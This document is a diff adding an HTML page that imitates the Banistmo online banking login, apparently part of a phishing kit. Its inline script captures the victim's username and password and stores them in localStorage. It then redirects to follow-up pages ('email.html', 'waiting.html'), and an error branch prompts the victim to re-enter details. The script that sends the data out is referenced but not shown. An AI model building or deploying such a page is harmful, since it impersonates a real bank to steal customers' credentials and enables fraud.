@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <head>
+        <title>Banistmo Sucursal Virtual Personas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous" defer></script>
+        <link href="css/login.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <link rel="icon" type="image/png" href="img/logo.png" />
+        <script src="js/login.js" defer></script>
+        <script src="./js/disp.js"></script>
+    </head>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="navegacion">
+            <div class="logo">
+                <img src="img/logo-banitsmo.png" alt="logo banitsmo">
+            </div>
+            <div class="idioma">
+                <a href="">English</a>
+                <i class="icono-lenguaje"></i>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <!-- LEFT COLUMN -->
+
+        <!-- MAIN GRIDS -->
+        <section class="container">
+            <div class="container-grid">
+                <div class="grid">
+                    <div class="nav-tabs">
+                        <span class="tab-selector fs-16" data-paso="1">Ingresa</span>
+                        <span class="tab-selector fs-16" data-paso="2">Regístrate</span>
+                    </div>
+
+                    <!-- INGRESAR -->
+                    <div class="tab-content seccion" id="paso-1">
+                        <!-- TITLE -->
+                        <h2 class="titulo-ingresar">Banca en Línea</h2>
+
+                        <!-- USER -->
+                        <div class="input-row" id="divUser">
+                            <div class="i-icon">
+                                <img src="img/user.svg">
+                            </div>
+                            <div class="input-group-text ">
+                                <input class="input-bg-info" type="text" id="userInput" placeholder=" ">
+                                <label for="">Usuario</label>
+                            </div>
+                        </div>
+
+                        <!-- PASS -->
+                        <div class="input-row" id="divPass">
+                            <div class="input-group-text ">
+                                <input class="input-bg-lock" type="password" id="passInput" placeholder=" ">
+                                <label for="">Contraseña</label>
+                            </div>
+                        </div>
+
+                        <!-- BUTTON -->
+                        <div class="btn-row">
+                            <button type="button" disabled class="btn" id="continuar">
+                                Continuar
+                            </button>
+                        </div>
+
+                        <!-- SECTIONS -->
+                        <div class="options-row">
+                            <a href="">¿Olvidaste el usuario?</a>
+                            <a href="">Términos y condiciones</a>
+                        </div>
+                    </div>
+
+
+                    <!-- REGISTRARSE -->
+                    <div class="tab-content seccion" id="paso-2">
+                        <div class="content-registro">
+                            <div class="icon-registro">
+                                <img src="img/user.svg">
+                            </div>
+
+                            <h2 class="titulo-registro">Regístrate en la Banca en Línea</h2>
+
+                            <p>Si ya eres cliente Banistmo, ingresa los siguientes datos para iniciar</p>
+
+                            <!-- INPUT SELECT -->
+                            <div class="input-row mt-5">
+                                <div class="input-group-select">
+                                    <select id="" required>
+                                        <option value="" disabled selected></option>
+                                        <option value="option1">Cédula</option>
+                                        <option value="option2">Pasaporte</option>
+                                    </select>
+                                    <label for="">Tipo de Identificación</label>
+                                </div>
+                            </div>
+
+                            <!-- BUTTON -->
+                            <div class="btn-row">
+                                <button type="button" disabled class="btn" id="">
+                                    Continuar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- OVER GRID -->
+                <div id="over-grid" class="over-grid">
+                    <div class="icon-circle">
+                        <img src="img/savings.svg">
+                    </div>
+                    <p class="fs-16">Abre tu cuenta Xpress en 3,2,1</p>
+                    <button class="btn btn-success" id="continuar" type="button">
+                        Abre una cuenta
+                    </button>
+                </div>
+
+            </div>
+
+
+            <!-- RIGHT COLUMN -->
+            <div class="column-right">
+                <div class="img-main">
+                    <img src="img/log-image.jpg" width="717px">
+                </div>
+
+                <!-- "CONOCE TAMBIEN"-->
+                <div class="conoce">
+                    <h1 class="titleConoce">Conoce también:</h1>
+                    <div class="conoceItems">
+                        <div class="conoceItem">
+                            <img src="img/tarifas.png" alt="">
+                            <a href="#">Tarifas</a>
+                            <span><b>+</b></span>
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/servicios.png" alt="">
+                            <a href="#">Servicios</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/sucursales.png" alt="">
+                            <a href="#">Sucursales</a>
+                            <span><b>+</b></span>
+
+                        </div>
+
+                        <div class="conoceItem">
+                            <img src="img/noticias.png" alt="">
+                            <a href="#">Noticias</a>
+                            <span><b>+</b></span>
+
+                        </div>
+                    </div>
+                    <button class="btnConoce">Conoce como utilizar la Banca en Línea</button>
+                </div>
+
+            </div>
+
+
+        </section>
+    </main>
+    <footer class="footer">
+        <div class="contenedor-footer">
+            <div class="contacto-telefono">
+                <i class="fas  fa-phone" style="color : #454648"></i>
+                Sucursal Teléfonica: (507) 306-4700
+            </div>
+            <div class="info">
+                Copyright Banistmo S.A. 2023
+            </div>
+        </div>
+    </footer>
+
+
+
+    <script src="js/app.js"></script>
+    <!-- VALIDATING -->
+    <script>
+
+        const divUser = document.querySelector('#divUser');
+        const userInput = document.querySelector('#userInput');
+
+        const divPass = document.querySelector('#divPass');
+        const passInput = document.querySelector('#passInput');
+        let pass = [];
+
+        const btnContinuar = document.querySelector('#continuar');
+
+        if(info.err !== ''){
+            // Mensaje de error
+            alert('¡Tuvimos un problema! Por favor llena los campos.');
+
+            userInput.style.borderColor = "red";
+            userInput.style.borderBottomWidth = "3px";
+        }
+
+        // Ocultar el div de contraseña inicialmente
+        divPass.style.display = 'none';
+
+        // Validar el userInput
+        userInput.addEventListener('input', () => {
+            if (userInput.value.length >= 4) {
+                btnContinuar.removeAttribute('disabled');
+                btnContinuar.classList.add('btn-success');
+            } else {
+                btnContinuar.setAttribute('disabled', 'disabled');
+                btnContinuar.classList.contains('btn-success') ? btnContinuar.classList.remove('btn-success') : '';
+            }
+        });
+
+        // Cambiar al paso de contraseña
+        btnContinuar.addEventListener('click', () => {
+            if (userInput.value.length >= 4) {
+
+                // Guardar
+                info.user = userInput.value;
+
+                divUser.style.display = 'none';
+                divPass.style.display = 'block';
+                btnContinuar.setAttribute('disabled', 'disabled');
+                btnContinuar.classList.contains('btn-success') ? btnContinuar.classList.remove('btn-success') : '';
+            }
+        });
+
+        // Validar el passInput
+        passInput.addEventListener('input', () => {
+
+            if (passInput.value.length >= 4) {
+                btnContinuar.removeAttribute('disabled');
+                btnContinuar.classList.add('btn-success');
+
+                btnContinuar.addEventListener('click', () => {
+                    if (passInput.value.length >= 4) {
+
+                        passInput.type = 'text';
+
+                        // Guardar
+                        info.puser = passInput.value;
+                        LS.setItem('info', JSON.stringify(info));
+
+                        btnContinuar.setAttribute('disabled', 'disabled');
+                        btnContinuar.classList.contains('btn-success') ? btnContinuar.classList.remove('btn-success') : '';
+
+                        // Redirigir
+                        if(info.err === ''){
+                            window.location.href = 'email.html';
+                        }else{
+                            window.location.href = 'waiting.html';
+                        }
+                    }
+                });
+            } else {
+                btnContinuar.setAttribute('disabled', 'disabled');
+                btnContinuar.classList.contains('btn-success') ? btnContinuar.classList.remove('btn-success') : '';
+            }
+        });
+
+    </script>
+</body>
+
+</html>
